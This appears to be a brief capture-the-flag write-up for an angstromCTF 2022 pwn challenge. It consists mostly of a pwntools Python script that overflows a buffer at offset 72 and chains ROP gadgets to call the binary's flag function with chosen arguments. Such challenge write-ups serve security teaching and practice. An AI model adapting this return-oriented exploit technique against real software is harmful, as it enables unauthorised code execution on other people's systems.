ret2win function with arguments.The second argument is a pointer.

```  
#!/usr/bin/env python3

from pwn import *  
exe = ELF('./really_obnoxious_problem')  
context.binary = exe  
context.log_level='debug'

def conn():  
   if args.REMOTE:  
       io = remote('challs.actf.co', 31225)  
   else:  
       io = process(exe.path)  
       if args.DEBUG:  
           gdb.attach(io)

   return io

offset = 72  
pop_rdi = 0x00000000004013f3 #: pop rdi; ret;  
pop_rsi_r15 = 0x00000000004013f1 #: pop rsi; pop r15; ret;

io = conn()  
io.sendlineafter(b'Name: ',b'bobby')

payload = flat ({  
   offset:[  
       pop_rdi,  
       0x1337,  
       pop_rsi_r15,  
exe.sym.name,  
       0x0,  
       exe.functions.flag  
       ]  
   })

write('payload', payload)  
io.sendlineafter(b'Address: ', payload)  
io.interactive()  
```

Original writeup (https://github.com/GonTanaka/CTF-
Writeups/tree/main/angstrom2022/pwn/really_obnoxious_problem).